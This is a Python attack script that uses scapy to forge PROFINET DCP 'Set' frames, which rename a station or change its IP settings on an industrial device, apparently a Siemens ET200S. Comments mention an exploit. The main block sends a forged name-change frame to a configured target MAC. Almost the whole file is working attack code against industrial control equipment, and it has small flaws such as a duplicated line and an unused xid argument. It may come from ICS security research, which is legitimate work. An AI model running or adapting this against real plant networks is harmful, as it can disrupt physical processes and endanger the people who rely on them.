#!/usr/bin/env python3

from scapy.all import *
from pnio import ProfinetIO
from pnio_dcp import *
from configmgr import ConfigMgr
import sys
from random import randint

REQUEST = 0
RESPONSE = 1

DCP_GET_SET_FRAME_ID = 0xFEFD
DCP_IDENTIFY_REQUEST_FRAME_ID = 0xFEFE
DCP_IDENTIFY_RESPONSE_FRAME_ID = 0xFEFF

PNIO_MULTICAST = "01:0e:cf:00:00:00"

class DCPSetAttack():
    def __init__(self):
        cm = ConfigMgr()

        self.TARGET_NAME = cm.getValue("Target", "name", "mallory")
        self.TARGET_MAC = cm.getValue("Target", "mac", "08:00:06:99:0a:be")
        self.IFACE = cm.getValue("Attacker", "iface", "enp0s25")


        self.SNIFF_FILTER_PNIO_MULTICAST = "ether dst 01:0e:cf:00:00:00"
        self.SNIFF_FILTER_PNIO = "ether proto 0x8892 or 0x8100"

    #### maybe the XID is the key to the et200s exploit
    def dcp_set_name_of_station_request(self, mac, name, xid=0x1):

        dcp_block_len = len(name) + 2

        dcp_data_len = dcp_block_len + 4

        if dcp_block_len % 2 != 0:
            dcp_data_len +=1

        # dcp_data_len +=6
        p = Ether(dst=mac)/ProfinetIO(frameID=DCP_GET_SET_FRAME_ID)/ProfinetDCP(xid=xid, service_id=4, service_type=REQUEST, option=2, sub_option=2,dcp_data_length=dcp_data_len, dcp_block_length=dcp_block_len, name_of_station=name, response_delay=0)
        return p

    #### maybe the XID is the key to the et200s exploit
    def dcp_set_ip_request(self, mac, ip, netmask, gateway, xid=0x1):

        if not ip:
            ip = "192.168.0.254"
        if not netmask:
            netmask = "255.255.255.0"
        if not gateway:
            gateway = "192.168.0.253"
        ### should be 14
        dcp_block_len = 14

        ### should be 18
        dcp_data_len = 18

        if dcp_block_len % 2 != 0:
            dcp_data_len +=1

        p= Ether(dst=mac) / ProfinetIO(frameID=DCP_GET_SET_FRAME_ID) / ProfinetDCP(xid=xid, service_id=4, service_type=REQUEST, option=1, sub_option=2, dcp_data_length=18, dcp_block_length=14, ip=ip, netmask=netmask, gateway=gateway)
        p= Ether(dst=mac) / ProfinetIO(frameID=DCP_GET_SET_FRAME_ID) / ProfinetDCP(xid=xid, service_id=4, service_type=REQUEST, option=1, sub_option=2, dcp_data_length=18, dcp_block_length=14, ip=ip, netmask=netmask, gateway=gateway)
        return p



######################
if __name__ == '__main__':

    dcp_set_attack = DCPSetAttack()

    try:
        # name
        name = sys.argv[1]
    except:
        name = dcp_set_attack.TARGET_NAME
        pass


    try:
        # mac
        mac = sys.argv[2]
    except:
        mac = dcp_set_attack.TARGET_MAC
        pass

    try:
        # xid
        xid = sys.argv[3]
    except:
        xid = randint(0x010003d5, 0x010007ff)
        pass


    set_name = dcp_set_attack.dcp_set_name_of_station_request(mac, name=name)
    set_name.show2()
    sendp(set_name, iface=dcp_set_attack.IFACE)

    # h = dcp_set_attack.dcp_set_ip_request(mac=mac)
    # h.show2()
    # sendp(h, iface=dcp_set_attack.IFACE)


